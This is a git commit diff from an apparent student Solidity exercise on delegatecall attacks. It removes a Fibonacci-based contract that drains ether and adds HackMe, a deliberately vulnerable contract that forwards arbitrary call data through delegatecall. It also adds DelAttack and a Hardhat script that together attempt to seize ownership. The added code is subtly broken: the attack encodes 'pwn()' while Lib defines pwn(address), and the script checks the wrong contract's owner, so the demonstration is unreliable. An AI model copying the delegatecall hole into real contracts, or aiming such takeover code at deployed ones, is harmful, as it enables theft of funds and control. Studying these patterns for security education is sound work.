03deb6db05cd98f2d3f34cebda217595232b7717
Oliver Brew <oliver.brew2014@epsomcollege.org.uk>
2022-04-08 15:55:35 +0100

    delegatecall

--- contracts/delegatecall.sol
+++ contracts/delegatecall.sol
@@ -1,48 +1,49 @@
 pragma solidity ^0.8.4;
 // library contract - calculates fibonacci-like numbers;
-
-
-contract FibonacciBalance {
-    address public fibonacciLibrary;
-    // the current fibonacci number to withdraw
-    uint public calculatedFibNumber;
-    // the starting fibonacci sequence number
-    uint public start = 3;    
-    uint public withdrawalCounter;
-    // the fibonancci function selector
-    string constant fibSig = "setFibonacci(uint256)";
+import "hardhat/console.sol";
+contract Lib {
+    address public owner;
     
-    // constructor - loads the contract with ether
-    constructor(address _fibonacciLibrary) payable {
-        fibonacciLibrary = _fibonacciLibrary;
+    function getOwner() public view returns(address) {
+        return owner;
     }
-    function withdraw() public {
-        withdrawalCounter += 1;
-        // calculate the fibonacci number for the current withdrawal user
-        // this sets calculatedFibNumber
-        address payable dest = payable(msg.sender);
-        fibonacciLibrary.delegatecall(abi.encodeWithSignature(fibSig, withdrawalCounter));
-        dest.transfer(calculatedFibNumber * 1 ether);
+
+    constructor() {
+        owner = msg.sender;
     }
-    
-    // allow users to call fibonacci library functions
-    fallback() external {
-        fibonacciLibrary.delegatecall(msg.data);
+
+    function pwn(address _Owner) public {
+        console.log("here");
+        owner = _Owner;
     }
 }
 
-contract fibAttack {
-    uint storageSlot0; // corresponds to fibonacciLibrary
-    uint storageSlot1;
-    address payable attacker; // corresponds to calculatedFibNumber
-    // fallback - this will run if a specified function is not found
-    constructor(){
-        attacker = payable(msg.sender);
+contract HackMe {
+    address public owner;
+    Lib public lib;
+
+    constructor(Lib _lib) {
+        owner = msg.sender;
+        lib = Lib(_lib);
     }
-    fallback() external {
-        storageSlot1 = 0;
-        // we set calculatedFibNumber to 0, so that if withdraw
-        // is called we don't send out any ether. 
-        attacker.transfer(address(this).balance); // we take all the ether
+
+    fallback() external payable {
+        console.log("here");
+        address(lib).delegatecall(msg.data);
     }
- }
+}
+
+contract DelAttack {
+    address public hackMe;
+    address public newOwner;
+    constructor(address _hackMe, address _newOwner) {
+        hackMe = _hackMe;
+        newOwner = _newOwner;
+    }
+
+    function attack() public {
+         console.log("here");
+         (bool sent, ) = hackMe.call{value:1 ether}(abi.encodeWithSignature("pwn()"));
+         console.log(sent);
+    }
+}
--- scripts/delegatecall.js
+++ scripts/delegatecall.js
@@ -1,13 +1,24 @@
 const { ethers } = require("hardhat");
 
 async function main(){
-    const FibLib = await ethers.getContractFactory("FibonacciLib");
-    const fiblib = await FibLib.deploy();
-    const FibBal = await ethers.getContractFactory("FibonacciBalance");
-    const fibbal = await FibBal.deploy(fiblib.address);
-    const Attack = await ethers.getContractFactory("fibAttack")
-    const attack = await Attack.deploy();
-    console.log("Contracts Deployed")
+    const [owner,Eve] = await ethers.getSigners();
+    const Lib = await ethers.getContractFactory("Lib");
+    const lib = await Lib.deploy();
+    const Hackme = await ethers.getContractFactory("HackMe");
+    const hackme = await Hackme.deploy(lib.address);
+    
+    
+    const Attack = await ethers.getContractFactory("DelAttack")
+    const attack = await Attack.deploy(hackme.address,Eve.address);
+    console.log("Contracts Deployed");
+    console.log(owner.address);
+    let cowner = await lib.owner();
+    console.log("Owner of lib is "+ cowner);
+    console.log("attacking...");
+    await attack.connect(Eve).attack();
+    await lib.getOwner().then( (cowner)=> {
+      console.log("Owner of lib is "+ cowner);
+    });
 }
 main().then(() => process.exit(0))
 .catch(error => {
